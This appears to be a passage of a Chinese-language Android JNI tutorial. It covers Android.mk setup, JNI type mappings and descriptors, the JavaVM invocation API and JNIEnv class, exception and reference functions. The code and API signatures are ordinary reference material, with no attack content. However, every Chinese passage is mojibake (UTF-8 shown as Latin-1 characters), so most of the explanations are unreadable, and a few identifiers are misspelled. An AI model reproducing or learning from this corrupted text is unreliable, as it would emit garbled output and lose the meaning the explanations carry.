é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª jni æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬åªéœ€è¦å³é”® app, ç„¶åç‚¹å‡» New-&gt;Folder-&gt;JNI Folder å°±å¯ä»¥åˆ›å»ºäº† æ¥ä¸‹æ¥ä» Android å¸ƒå±€è½¬åˆ° Project å¸ƒå±€ï¼Œå°±å¯ä»¥çœ‹åˆ°æ–°åˆ›å»ºçš„ jni æ–‡ä»¶å¤¹ éšååˆ›å»ºä¸€ä¸ª oacia.c å’Œ Android.mk ä¹‹åæˆ‘ä»¬éœ€è¦ç¼–å†™ Android.mk , å…³äºè¯­æ³•å¯ä»¥å‚è€ƒä¸‹é¢çš„é“¾æ¥ Android.mk è¯­æ³• äºæ˜¯ Android.mk çš„å†…å®¹å¦‚ä¸‹ LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := oaciaLOCAL_SRC_FILES := oacia.cinclude $(BUILD_SHARED_LIBRARY)#BUILD_SHARED_LIBRARY ç”Ÿæˆå…±äº«é“¾æ¥åº“#å¦‚æœæƒ³è¦ç”Ÿæˆå•ç‹¬çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ BUILD_EXECUTABLEAndroid.mk ç¼–å†™å®Œæˆä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªé…ç½®æ–‡ä»¶å’Œæˆ‘ä»¬çš„ç›®æ ‡æºæ–‡ä»¶ oacia.c é“¾æ¥åœ¨ä¸€èµ·ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ å³é”® app æ–‡ä»¶å¤¹ï¼Œé€‰æ‹© Add C++ to Module ç„¶åé€‰ä¸­æˆ‘ä»¬ä¹‹å‰ç¼–å†™çš„ Android.mk æ–‡ä»¶å³å¯å®Œæˆé“¾æ¥ éšåæˆ‘ä»¬æ¥åˆ°å£°æ˜ jni å±‚å‡½æ•°çš„ä½ç½®ï¼Œé¼ æ ‡æ‚¬æµ®åœ¨çˆ†çº¢çš„å‡½æ•°ï¼Œç‚¹å‡» Create JNI function for Android studio ä¾¿è‡ªåŠ¨ä¸ºæˆ‘ä»¬å®Œæˆäº†å‡½æ•°çš„å®šä¹‰å·¥ä½œ # æ•°æ®ç±»å‹ # åŸºæœ¬æ•°æ®ç±»å‹ Java ç±»å‹ JNI æ•°æ®ç±»å‹ ä½æ•° boolean jboolean unsigned 8 bits byte jbyte signed 8 bits char jchar unsigned 16 bits short jshort signed 16 bits int jint signed 32 bits long jlong signed 64 bits float jfloat 32 bits double jdouble 64 bits # å¼•ç”¨æ•°æ®ç±»å‹ Java ç±»å‹ JNI æ•°æ®ç±»å‹ void void java.lang.Object jobject java.lang.Class jclass java.lang.String jstring java.lang.Throwable jthrowable Object[] jobjectArray boolean[] jbooleanArray byte[] jbyteArray char[] jcharArray short[] jshortArray int[] jintArray long[] jlongArray float[] jfloatArray double[] jdoubleArray # jvalue ç±»å‹ typedef union jvalue &#123; jboolean z; jbyte b; jchar c; jshort s; jint i; jlong j; jfloat f; jdouble d; jobject l;&#125; jvalue;# ç±»å‹æè¿°ç¬¦ çœ‹èµ·æ¥å’Œ smali çš„ç±»å‹å£°æ˜ä¸€æ¨¡ä¸€æ · Java ç±»å‹ ç±»å‹æè¿°ç¬¦ boolean Z short S float F byte B int I double D char C long J void V å¼•ç”¨ç±»å‹ L + å…¨é™å®šå + ; æ•°ç»„ [+ ç±»å‹æè¿°ç¬¦ æ–¹æ³• (å‚æ•°çš„ç±»å‹æè¿°ç¬¦) è¿”å›å€¼çš„ç±»å‹æè¿°ç¬¦ è¡¨ç¤ºä¸€ä¸ª string ç±» L + å…¨é™å®šå ï¼Œå…¶ä¸­ . æ¢æˆ / , æœ€ååŠ ä¸Š ; java ç±»å‹ ç±»å‹æè¿°ç¬¦ java.lang.String Ljava/lang/String; è¡¨ç¤ºæ•°ç»„ java ç±»å‹ ç±»å‹æè¿°ç¬¦ String[] [Ljava/lang/String; int[][] [[I è¡¨ç¤ºæ–¹æ³• java ç±»å‹ ç±»å‹æè¿°ç¬¦ long f (int n,String s,int arr[]); (ILjava/lang/String;[I) J void f (); () V # å…¶ä»–å¸¸ç”¨ç±»å‹ typedef jint jsize;struct _jfieldID; /* opaque structure */typedef struct _jfieldID* jfieldID; /* field IDs */struct _jmethodID; /* opaque structure */typedef struct _jmethodID* jmethodID; /* method IDs */#define JNI_FALSE 0#define JNI_TRUE 1#define JNI_VERSION_1_1 0x00010001#define JNI_VERSION_1_2 0x00010002#define JNI_VERSION_1_4 0x00010004#define JNI_VERSION_1_6 0x00010006#define JNI_OK (0) /* no error */#define JNI_ERR (-1) /* generic error */#define JNI_EDETACHED (-2) /* thread detached from the VM */#define JNI_EVERSION (-3) /* JNI version error */#define JNI_COMMIT 1 /* copy content, do not free buffer */#define JNI_ABORT 2 /* free buffer w/o copying back */# JavaVM # å®šä¹‰ javaVM æ˜¯ java è™šæ‹Ÿæœºåœ¨ jni å±‚çš„ä»£è¡¨ï¼Œåœ¨ Android ä¸Šï¼Œ ä¸€ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ª JavaVMï¼Œæ‰€æœ‰çš„çº¿ç¨‹å…±ç”¨ä¸€ä¸ª JavaVM, ä¹Ÿå°±æ˜¯åœ¨ Android è¿›ç¨‹ä¸­æ˜¯é€šè¿‡æœ‰ä¸”åªæœ‰ä¸€ä¸ªè™šæ‹Ÿæœºå¯¹è±¡æ¥æœåŠ¡æ‰€æœ‰ Java å’Œ C/C++ ä»£ç ã€‚ # Invocation API Invocation API å…è®¸è½¯ä»¶æä¾›å•†åœ¨åŸç”Ÿç¨‹åºä¸­å†…åµŒ Java è™šæ‹Ÿæœºã€‚å› æ­¤å¯ä»¥ä¸éœ€è¦é“¾æ¥ä»»ä½• Java è™šæ‹Ÿæœºä»£ç æ¥æä¾› Java-enabled çš„åº”ç”¨ç¨‹åºã€‚ # DestoryJavaVM å¸è½½ä¸€ä¸ª Java è™šæ‹Ÿæœºï¼Œå¹¶æ”¶å›å®ƒæ‹¥æœ‰çš„èµ„æºã€‚ /*@param vm: éœ€è¦è¢«é”€æ¯çš„è™šæ‹Ÿæœºã€‚@return: æˆåŠŸè¿”å› JNI_OK ï¼Œå¤±è´¥è¿”å›è´Ÿæ•°ã€‚*/jint DestroyJavaVM(JavaVM *vm); JDK/JRE 1.1 è¿˜æ²¡æœ‰å®Œå…¨æ”¯æŒè¿™ä¸ªå‡½æ•°ã€‚åœ¨ JDK/JRE 1.1 åªæœ‰ä¸»çº¿ç¨‹æ‰å…è®¸è°ƒç”¨è¯¥å‡½æ•°ã€‚ ä» JDK/JRE 1.2 å¼€å§‹ï¼Œä»»ä½•çº¿ç¨‹ï¼Œä¸ç®¡æ˜¯å¦å·²ç» attachedï¼Œéƒ½å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¦‚æœå½“å‰çº¿ç¨‹å·²ç» attachedï¼Œåˆ™è™šæ‹Ÿæœºä¼šç­‰å¾…å½“å‰çº¿ç¨‹ä½œä¸ºå”¯ä¸€çš„éå®ˆæŠ¤ç”¨æˆ·çº¿ç¨‹ã€‚ å¦‚æœå½“å‰çº¿ç¨‹æ²¡æœ‰ attachedï¼Œåˆ™å…ˆ attachedï¼Œå†ç­‰å¾…å½“å‰çº¿ç¨‹ä½œä¸ºå”¯ä¸€çš„éå®ˆæŠ¤ç”¨æˆ·çº¿ç¨‹ã€‚ JDK/JRE 1.1.2 ä¸æ”¯æŒ unload è™šæ‹Ÿæœºã€‚ # AttachCurrentThread é™„åŠ å½“å‰çº¿ç¨‹åˆ° JavaVM , å¹¶è¿”å› JNIEnv /*@param vm: éœ€è¦è¢« attach åˆ°çš„è™šæ‹Ÿæœºã€‚@param p_env: è¿”å›çš„å½“å‰çº¿ç¨‹çš„ JNI æ¥å£æŒ‡é’ˆã€‚@param thr_args: JavaVMAttachArgs ç»“æ„ä½“æ¥æŒ‡å®šé™„åŠ ä¿¡æ¯ï¼Œæˆ–ä¼ å…¥ NULL@return: æˆåŠŸè¿”å› JNI_OK ï¼Œå¤±è´¥è¿”å›è´Ÿæ•°ã€‚*/jint AttachCurrentThread(JavaVM *vm, void **p_env, void *thr_args);thr_args thr_args çš„ç»“æ„ä½“å¦‚ä¸‹ typedef struct JavaVMAttachArgs &#123; jint version; /* must be at least JNI_VERSION_1_2 */ char *name; /* the name of the thread as a modified UTF-8 string, or NULL */ jobject group; /* global ref of a ThreadGroup object, or NULL */&#125; JavaVMAttachArgs å°è¯• attach å·²ç» attached è¿‡çš„çº¿ç¨‹ä¸ä¼šæ‰§è¡Œä»»ä½•æ“ä½œï¼ˆno-opï¼‰ã€‚ ä¸€ä¸ªæœ¬åœ°çº¿ç¨‹ä¸èƒ½åŒæ—¶ attach åˆ°ä¸¤ä¸ªä¸åŒçš„ Java è™šæ‹Ÿæœºã€‚ å½“å‰ä¸€ä¸ªçº¿ç¨‹ attach åˆ°è™šæ‹Ÿæœºï¼Œå®ƒçš„ä¸Šä¸‹æ–‡ ClassLoader æ˜¯ Bootstrap ClassLoaderã€‚ # AttachCurrentThreadAsDaemon å’Œ AttachCurrentThread ç±»ä¼¼ï¼Œåªæ˜¯æ–°åˆ›å»ºçš„ java.lang.Thread è¢«è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼ˆdaemonï¼‰ /*@param vm: éœ€è¦è¢« attach åˆ°çš„è™šæ‹Ÿæœºã€‚@param p_env: è¿”å›çš„å½“å‰çº¿ç¨‹çš„ JNI æ¥å£æŒ‡é’ˆã€‚@param thr_args: JavaVMAttachArgs ç»“æ„ä½“æ¥æŒ‡å®šé™„åŠ ä¿¡æ¯ï¼Œæˆ–ä¼ å…¥ NULL@return: æˆåŠŸè¿”å› JNI_OK ï¼Œå¤±è´¥è¿”å›è´Ÿæ•°ã€‚*/jint AttachCurrentThreadAsDaemon(JavaVM* vm, void** p_env, void* args);# DetachCurrentThread ä» java è™šæ‹Ÿæœº detach å½“å‰çº¿ç¨‹ã€‚æ‰€æœ‰è¿™ä¸ªçº¿ç¨‹æŒæœ‰çš„ Java ç›‘è§†åŒº (monitor) éƒ½ä¼šè¢«é‡Šæ”¾ã€‚ jint DetachCurrentThread(JavaVM *vm); ä» JDK/JRE 1.2 å¼€å§‹ï¼Œä¸»çº¿ç¨‹å¯ä»¥ä»è™šæ‹Ÿæœº detachã€‚ # GetEnv è·å–å½“å‰çº¿ç¨‹çš„ JNI æ¥å£æŒ‡é’ˆ JNIEnv /*@param vm: å½“å‰çš„ JavaVM è™šæ‹Ÿæœº@param env: å­˜å‚¨è¿”å›çš„å½“å‰çº¿ç¨‹çš„ JNI æ¥å£æŒ‡é’ˆã€‚@param version: JNI ç‰ˆæœ¬ã€‚@return: å¦‚æœå½“å‰çº¿ç¨‹è¿˜æ²¡æœ‰ attach åˆ°è™šæ‹Ÿæœºï¼Œåˆ™è®¾ç½® *env ä¸º NULL ï¼Œå¹¶è¿”å› JNI_EDETACHEDã€‚ å¦‚æœæŒ‡å®šçš„ JNI ç‰ˆæœ¬ä¸è¢«æ”¯æŒï¼Œåˆ™è®¾ç½® *env ä¸º NULL ï¼Œå¹¶ä¸”è¿”å› JNI_EVERSIONã€‚ å¦åˆ™è®¾ç½® *env ä¸ºæ­£å¸¸çš„æ¥å£ï¼Œå¹¶è¿”å› JNI_OK */jint GetEnv(JavaVM *vm, void **env, jint version);# JavaVM è™šæ‹ŸæœºåŠ è½½æµç¨‹ # åˆ›å»ºè™šæ‹Ÿæœº JNI_CreateJavaVM() å‡½æ•°è½½å…¥å’Œåˆå§‹åŒ–ä¸€ä¸ª Java è™šæ‹Ÿæœºã€‚è°ƒç”¨è¯¥å‡½æ•°çš„çº¿ç¨‹è¢«è§†ä¸ºæ˜¯ä¸»çº¿ç¨‹ï¼ˆmain threadï¼‰ã€‚ #inlcude &lt;jni.h>/*@param p_vm: æŒ‡å‘ JavaVM * çš„æŒ‡é’ˆï¼Œå‡½æ•°æˆåŠŸè¿”å›æ—¶ä¼šç»™ JavaVM * æŒ‡é’ˆèµ‹å€¼ã€‚@param p_env: æŒ‡å‘ JNIEnv * çš„æŒ‡é’ˆï¼Œå‡½æ•°æˆåŠŸè¿”å›æ—¶ä¼šç»™ JNIEnv * æŒ‡é’ˆèµ‹å€¼ã€‚@param vm_args: æŒ‡å‘ JavaVMInitArgs çš„æŒ‡é’ˆï¼Œæ˜¯åˆå§‹åŒ–è™šæ‹Ÿæœºçš„å‚æ•°ã€‚@return: å¦‚æœå‡½æ•°æ‰§è¡ŒæˆåŠŸï¼Œè¿”å› JNI_OK (å€¼ä¸º 0)ï¼Œå¦‚æœå¤±è´¥è¿”å›è´Ÿå€¼ã€‚*/jint JNI_CreateJavaVM(JavaVM **p_vm, void **p_env, void *vm_args);vm_args ç¬¬ 3 ä¸ªå‚æ•° vm_args çš„ç»“æ„ä½“ä¸ºï¼š typedef struct JavaVMInitArgs &#123; jint version; jint nOptions; JavaVMOption *options; jboolean ignoreUnrecognized;&#125; JavaVMInitArgs; version å¿…é¡»å¤§äºç­‰äº JNI_VERSION_1_2 , nOptions ä¸º options çš„æ•°é‡. options çš„ç»“æ„ä½“ä¸º: typedef struct JavaVMOption &#123; char *optionString; /* the option as a string in the default platform encoding */ void *extraInfo;&#125; JavaVMOption; ignoreUnrecognized è®¾ç½®ä¸º JNI_TRUE ï¼Œåˆ™ä¼šå¿½è§†æ‰€æœ‰ä¸è¢«è¯†åˆ«çš„ä»¥ -X æˆ– _ å¼€å¤´çš„å‚æ•°å­—ç¬¦ä¸²ï¼Œå¦‚æœè®¾ç½®ä¸º JNI_FALSE ï¼Œåˆ™é‡åˆ°ä¸è¢«è¯†åˆ«çš„å‚æ•°æ—¶ JNI_CreateJavaVM å‡½æ•°ä¼šè¿”å› JNI_ERR æ‰€æœ‰è™šæ‹Ÿæœºçš„å®ç°éƒ½æ”¯æŒå®ƒè‡ªå·±çš„éæ ‡å‡†å‚æ•°ã€‚éæ ‡å‡†å‚æ•°å¿…é¡»ä»¥ -X æˆ– _ å¼€å¤´ã€‚ä¾‹å¦‚ï¼ŒJDK/JRE æ”¯æŒ -Xms å’Œ -Xmx å‚æ•°æ¥å…è®¸å¼€å‘è€…æŒ‡å®šåˆå§‹åŒ–å’Œæœ€å¤§çš„ heap å¤§å°ã€‚ åœ¨ JDK/JRE 1.2ï¼Œä¸å…è®¸åœ¨åŒä¸€ä¸ªè¿›ç¨‹åˆ›å»ºå¤šä¸ª Java è™šæ‹Ÿæœºã€‚ ä½¿ç”¨ç¤ºä¾‹ JavaVMInitArgs vm_args;JavaVMOption options[4];options[0].optionString = \"-Djava.compiler=NONE\"; /* disable JIT */options[1].optionString = \"-Djava.class.path=c:\\myclasses\"; /* user classes */options[2].optionString = \"-Djava.library.path=c:\\mylibs\"; /* set native library path */options[3].optionString = \"-verbose:jni\"; /* print JNI-related messages */vm_args.version = JNI_VERSION_1_2;vm_args.options = options;vm_args.nOptions = 4;vm_args.ignoreUnrecognized = TRUE;/* Note that in the JDK/JRE, there is no longer any need to call * JNI_GetDefaultJavaVMInitArgs. */res = JNI_CreateJavaVM(&amp;vm, (void **)&amp;env, &amp;vm_args);if (res &lt; 0) ...# çº¿ç¨‹é™„åŠ åˆ°è™šæ‹Ÿæœº JNI æ¥å£æŒ‡é’ˆ (JNIEnv) åªåœ¨å½“å‰çº¿ç¨‹æœ‰æ•ˆï¼Œå¦‚æœéœ€è¦åœ¨å¦ä¸€ä¸ªçº¿ç¨‹è®¿é—® Java è™šæ‹Ÿæœºï¼Œå¿…é¡»å…ˆè°ƒç”¨ AttachCurrentThread() æ¥å°†è‡ªå·± attach åˆ°è™šæ‹Ÿæœºæ¥è·å¾— JNI æ¥å£æŒ‡é’ˆ JNIEnv çº¿ç¨‹å¿…é¡»æœ‰è¶³å¤Ÿçš„æ ˆç©ºé—´æ¥æ‰§è¡Œä¸€å®šçš„å·¥ä½œã€‚æ¯ä¸ªçº¿ç¨‹åˆ†é…å¤šå°‘æ ˆç©ºé—´æ ¹æ®ç³»ç»Ÿè€Œä¸åŒã€‚ # è„±ç¦»è™šæ‹Ÿæœº ä¸€ä¸ª attach åˆ°è™šæ‹Ÿæœºçš„æœ¬åœ°çº¿ç¨‹å¿…é¡»åœ¨é€€å‡ºå‰è°ƒç”¨ DetachCurrentThread() æ¥å’Œè™šæ‹Ÿæœºè„±ç¦»ã€‚å¦‚æœè¿˜æœ‰ Java æ–¹æ³•åœ¨ call stack ä¸­ï¼Œåˆ™è¿™ä¸ªçº¿ç¨‹ä¸èƒ½è¢« detachã€‚ # å¸è½½è™šæ‹Ÿæœº ä½¿ç”¨ JNI_DestroyJavaVM() å‡½æ•°æ¥å¸è½½ä¸€ä¸ª Java è™šæ‹Ÿæœº è™šæ‹Ÿæœºä¼šç­‰å¾…ï¼ˆé˜»å¡ï¼‰ï¼Œç›´åˆ°å½“å‰çº¿ç¨‹æˆä¸ºå”¯ä¸€çš„éå®ˆæŠ¤è¿›ç¨‹çš„ç”¨æˆ·è¿›ç¨‹ï¼Œæ‰çœŸæ­£æ‰§è¡Œå¸è½½æ“ä½œã€‚ ç”¨æˆ·è¿›ç¨‹ (user thread) åŒ…æ‹¬: Java çº¿ç¨‹ (java threads) attached åˆ°è™šæ‹Ÿæœºçš„æœ¬åœ°çº¿ç¨‹ (attached native threads) ä¸ºä»€ä¹ˆè¦åšè¿™æ ·çš„é™åˆ¶ï¼ˆå¼ºåˆ¶ç­‰å¾…ï¼‰ï¼Œæ˜¯å› ä¸º Java çº¿ç¨‹å’Œ native çº¿ç¨‹å¯èƒ½ä¼š hold ä½ç³»ç»Ÿèµ„æºï¼Œä¾‹å¦‚é”ï¼Œçª—å£ç­‰èµ„æºï¼Œè€Œè™šæ‹Ÿæœºä¸èƒ½è‡ªåŠ¨é‡Šæ”¾è¿™äº›èµ„æºã€‚é€šè¿‡é™åˆ¶å½“å‰çº¿ç¨‹æ˜¯å”¯ä¸€çš„è¿è¡Œä¸­çš„ç”¨æˆ·çº¿ç¨‹æ‰ unload è™šæ‹Ÿæœºï¼Œåˆ™å°†é‡Šæ”¾è¿™ç§ç³»ç»Ÿèµ„æºçš„ä»»åŠ¡äº¤ç»™ç¨‹åºå‘˜è‡ªå·±æ¥è´Ÿè´£äº†ã€‚ # è·å– JavaVM æ¥å£ åœ¨ Java VM è™šæ‹ŸæœºåŠ è½½åŠ¨æ€é“¾æ¥åº“æ—¶ï¼Œå¯ä»¥åœ¨ JNI_OnLoad çš„å‚æ•°ä¸­è·å–åˆ° JavaVM JavaVM *global_jvm;JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) &#123; global_jvm = vm;&#125; é€šè¿‡ JNIEnv è·å– JavaVM JavaVM *gJavaVM;jobject gJavaObj;JNIEXPORT void JNICALL Java_com_xxx_android2native_JniManager_openJni (JNIEnv * env, jobject object)&#123; // çº¿ç¨‹ä¸å…è®¸å…±ç”¨ env ç¯å¢ƒå˜é‡ï¼Œä½†æ˜¯ JavaVM æŒ‡é’ˆæ˜¯æ•´ä¸ª jvm å…±ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•ä¿å­˜ JavaVM æŒ‡é’ˆï¼Œåœ¨çº¿ç¨‹ä¸­ä½¿ç”¨ env->GetJavaVM(&amp;gJavaVM); // åŒç†ï¼Œjobject å˜é‡ä¹Ÿä¸å…è®¸åœ¨çº¿ç¨‹ä¸­å…±ç”¨ï¼Œå› æ­¤éœ€è¦åˆ›å»ºå…¨å±€çš„ jobject å¯¹è±¡åœ¨çº¿ç¨‹ä¸­è®¿é—®è¯¥å¯¹è±¡ gJavaObj = env->NewGlobalRef(object);&#125; # JNIEnv # å®šä¹‰ JNIEnv æ˜¯æä¾› JNI Native å‡½æ•°çš„åŸºç¡€ç¯å¢ƒï¼Œçº¿ç¨‹ç›¸å…³ï¼Œä¸åŒçº¿ç¨‹çš„ JNIEnv ç›¸äº’ç‹¬ç«‹ï¼Œå¹¶ä¸” JNIEnv æ˜¯ä¸€ä¸ª JNI æ¥å£æŒ‡é’ˆï¼ŒæŒ‡å‘äº†æœ¬åœ°æ–¹æ³•çš„ä¸€ä¸ªå‡½æ•°è¡¨ï¼Œè¯¥å‡½æ•°è¡¨ä¸­çš„æ¯ä¸€ä¸ªæˆå‘˜æŒ‡å‘äº†ä¸€ä¸ª JNI å‡½æ•°ï¼Œæœ¬åœ°æ–¹æ³•é€šè¿‡ JNI å‡½æ•°æ¥è®¿é—® JVM ä¸­çš„æ•°æ®ç»“æ„. # JNI å‡½æ•° # ç‰ˆæœ¬ä¿¡æ¯ # GetVersion è·å– JNI ç‰ˆæœ¬å· /*@param env: JNI interface æŒ‡é’ˆ@return: è¿”å›ä¸€ä¸ªåå…­è¿›åˆ¶æ•´æ•°ï¼Œå…¶ä¸­é«˜ 16 ä½è¡¨ç¤ºä¸»ç‰ˆæœ¬å·ï¼Œä½ 16 ä½æ ‡è¯†è¡¨ç¤ºæ¬¡ç‰ˆæœ¬å·ï¼Œå¦‚ï¼š1.2, GetVersion () è¿”å› 0x00010002, 1.4, GetVersion () returns 0x00010004.*/jint GetVersion(JNIEnv *env);åé¢å†å‡ºç° JNIEnv *env è¿™æ ·çš„å‚æ•°ä¸å†æ³¨é‡Š # ç±»æ“ä½œ # DefineClass ä»åŸå§‹ç±»æ•°æ®çš„ç¼“å†²åŒºä¸­åŠ è½½ç±»ã€‚ /*@param loader: åˆ†æ´¾ç»™æ‰€å®šä¹‰çš„ç±»çš„ç±»åŠ è½½å™¨@param buf: åŒ…å« .class æ–‡ä»¶æ•°æ®çš„ç¼“å†²åŒº @param buflen: ç¼“å†²åŒºé•¿åº¦@return: è¿”å› Java ç±»å¯¹è±¡ã€‚å¦‚æœå‡ºé”™åˆ™è¿”å› NULLã€‚@throw: ClassFormatError å¦‚æœç±»æ•°æ®æŒ‡å®šçš„ç±»æ— æ•ˆ ClassCircularityError å¦‚æœç±»æˆ–æ¥å£æ˜¯è‡ªèº«çš„è¶…ç±»æˆ–è¶…æ¥å£ OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jclass DefineClass (JNIEnv *env, jobject loader, const jbyte *buf , jsize bufLen);# FindClass è¯¥å‡½æ•°ç”¨äºåŠ è½½ Java ç±»ã€‚å®ƒå°†åœ¨ CLASSPATH ç¯å¢ƒå˜é‡æ‰€æŒ‡å®šçš„ç›®å½•å’Œ zip æ–‡ä»¶é‡Œæœç´¢æŒ‡å®šçš„ç±»åã€‚ /*@param name: ç±»å…¨å = (åŒ…å +â€˜/â€™+ ç±»å).replace ('.', '/');@return: ç±»å¯¹è±¡å…¨åï¼›å¦‚æœæ‰¾ä¸åˆ°è¯¥ç±»ï¼Œåˆ™è¿”å› NULLã€‚@throw: ClassFormatError å¦‚æœç±»æ•°æ®æŒ‡å®šçš„ç±»æ— æ•ˆ ClassCircularityError å¦‚æœç±»æˆ–æ¥å£æ˜¯è‡ªèº«çš„è¶…ç±»æˆ–è¶…æ¥å£ NoClassDefFoundError å¦‚æœæ‰¾ä¸åˆ°æ‰€è¯·æ±‚çš„ç±»æˆ–æ¥å£çš„å®šä¹‰ OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jclass FindClass(JNIEnv *env, const char *name);# GetObjectClass é€šè¿‡å¯¹è±¡è·å–è¿™ä¸ªç±»ã€‚è¯¥å‡½æ•°æ¯”è¾ƒç®€å•ï¼Œå”¯ä¸€æ³¨æ„çš„æ˜¯å¯¹è±¡ä¸èƒ½ä¸º NULLï¼Œå¦åˆ™è·å–çš„ class è‚¯å®šè¿”å›ä¹Ÿä¸º NULLã€‚ /*@param obj: Java ç±»å¯¹è±¡å®ä¾‹*/ jclass GetObjectClass (JNIEnv *env, jobject obj);# GetSuperclass è·å–çˆ¶ç±»æˆ–è€…è¯´è¶…ç±» /*@param clazz: Java ç±»å¯¹è±¡@return: å¦‚æœ clazz ä»£è¡¨ä¸€èˆ¬ç±»è€Œé Object ç±»ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ç”± clazz æ‰€æŒ‡å®šçš„ç±»çš„è¶…ç±»ã€‚ å¦‚æœ clazz æŒ‡å‘ Object ç±»æˆ–ä»£è¡¨æŸä¸ªæ¥å£ï¼Œåˆ™è¯¥å‡½æ•°è¿”å› NULLã€‚*/ jclass GetSuperclass (JNIEnv *env, jclass clazz);# IsAssignableFrom ç¡®å®š clazz1 çš„å¯¹è±¡æ˜¯å¦å¯å®‰å…¨åœ°å¼ºåˆ¶è½¬æ¢ä¸º clazz2 /*@param clazz1: æºç±»å¯¹è±¡@param clazz2: ç›®æ ‡ç±»å¯¹è±¡@return: ä»¥ä¸‹ä¸‰ç§æƒ…å†µè¿”å› JNI_TRUE, å¦åˆ™è¿”å› JNI_FALSE 1. ç¬¬ä¸€åŠç¬¬äºŒä¸ªç±»å‚æ•°å¼•ç”¨åŒä¸€ä¸ª Java ç±» 2. ç¬¬ä¸€ä¸ªç±»æ˜¯ç¬¬äºŒä¸ªç±»çš„å­ç±» 3. ç¬¬äºŒä¸ªç±»æ˜¯ç¬¬ä¸€ä¸ªç±»çš„æŸä¸ªæ¥å£*/ jboolean IsAssignableFrom (JNIEnv *env, jclass clazz1, jclass clazz2);# å¼‚å¸¸æ“ä½œ # Throw æŠ›å‡º java.lang.Throwable å¯¹è±¡ /* @param obj: java.lang.Throwable å¯¹è±¡ @return: æˆåŠŸæ—¶è¿”å› 0ï¼Œå¤±è´¥æ—¶è¿”å›è´Ÿæ•° @throw: java.lang.Throwable å¯¹è±¡ obj*/jint Throw(JNIEnv *env, jthrowable obj);# ThrowNew åˆ©ç”¨æŒ‡å®šç±»çš„æ¶ˆæ¯ï¼ˆç”± message æŒ‡å®šï¼‰æ„é€ å¼‚å¸¸å¯¹è±¡å¹¶æŠ›å‡ºè¯¥å¼‚å¸¸ /*@param clazz: java.lang.Throwable çš„å­ç±»@param message: ç”¨äºæ„é€  java.lang.Throwable å¯¹è±¡çš„æ¶ˆæ¯@return: æˆåŠŸæ—¶è¿”å› 0ï¼Œå¤±è´¥æ—¶è¿”å›è´Ÿæ•°@throw: æ–°æ„é€ çš„ java.lang.Throwable å¯¹è±¡*/ jint ThrowNew (JNIEnv *env , jclass clazz, const char *message);# ExceptionOccurred ç¡®å®šæŸä¸ªå¼‚å¸¸æ˜¯å¦æ­£è¢«æŠ›å‡ºã€‚åœ¨æœ¬åœ°ä»£ç è°ƒç”¨ ExceptionClear () æˆ– Java ä»£ç å¤„ç†è¯¥å¼‚å¸¸å‰ï¼Œå¼‚å¸¸å°†å§‹ç»ˆä¿æŒæŠ›å‡ºçŠ¶æ€ã€‚ /*@return: è¿”å›æ­£è¢«æŠ›å‡ºçš„å¼‚å¸¸å¯¹è±¡ï¼Œå¦‚æœå½“å‰æ— å¼‚å¸¸è¢«æŠ›å‡ºï¼Œåˆ™è¿”å› NULL*/ jthrowable ExceptionOccurred (JNIEnv *env);# ExceptionDescribe å°†å¼‚å¸¸åŠå †æ ˆçš„å›æº¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆä¾‹å¦‚ stderrï¼‰ã€‚è¯¥ä¾‹ç¨‹å¯ä¾¿åˆ©è°ƒè¯•æ“ä½œã€‚ void ExceptionDescribe (JNIEnv *env);# ExceptionClear æ¸…é™¤å½“å‰æŠ›å‡ºçš„ä»»ä½•å¼‚å¸¸ã€‚å¦‚æœå½“å‰æ— å¼‚å¸¸ï¼Œåˆ™ä¸äº§ç”Ÿä»»ä½•æ•ˆæœã€‚ void ExceptionClear (JNIEnv *env);# FatalError æŠ›å‡ºè‡´å‘½é”™è¯¯å¹¶ä¸”ä¸å¸Œæœ›è™šæ‹Ÿæœºè¿›è¡Œä¿®å¤ã€‚è¯¥å‡½æ•°æ— è¿”å›å€¼ /*@param msg: é”™è¯¯æ¶ˆæ¯*/ void FatalError (JNIEnv *env, const char *msg);# å…¨å±€åŠå±€éƒ¨å¼•ç”¨ # DeleteWeakGlobalRef åˆ é™¤å¼±å…¨å±€å¼•ç”¨ void DeleteWeakGlobalRef(JNIEnv *env, jweak obj);# NewWeakGlobalRef ç”¨ obj åˆ›å»ºæ–°çš„å¼±å…¨å±€å¼•ç”¨ /*@param obj: å…¨å±€æˆ–å±€éƒ¨å¼•ç”¨@return: è¿”å›å¼±å…¨å±€å¼•ç”¨ï¼Œå¼± obj æŒ‡å‘ nullï¼Œæˆ–è€…å†…å­˜ä¸è¶³æ—¶è¿”å› NULLï¼ŒåŒæ—¶æŠ›å‡ºå¼‚å¸¸*/ jweak NewWeakGlobalRef(JNIEnv *env, jobject obj);# DeleteLocalRef åˆ é™¤ localRef æ‰€æŒ‡å‘çš„å±€éƒ¨å¼•ç”¨ /*@param localRef: å±€éƒ¨å¼•ç”¨*/ void DeleteLocalRef (JNIEnv *env, jobject localRef);# NewLocalRef åˆ›å»º obj å‚æ•°æ‰€å¼•ç”¨å¯¹è±¡çš„å±€éƒ¨å¼•ç”¨ï¼Œåˆ›å»ºçš„å¼•ç”¨è¦é€šè¿‡è°ƒç”¨ DeleteLocalRef () æ¥æ˜¾å¼åˆ é™¤ /*@param obj: å…¨å±€æˆ–å±€éƒ¨å¼•ç”¨@return: è¿”å›å±€éƒ¨å¼•ç”¨ï¼Œå¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³åˆ™è¿”å› NULL*/ jobject NewLocalRef(JNIEnv *env, jobject ref);# DeleteGlobalRef åˆ 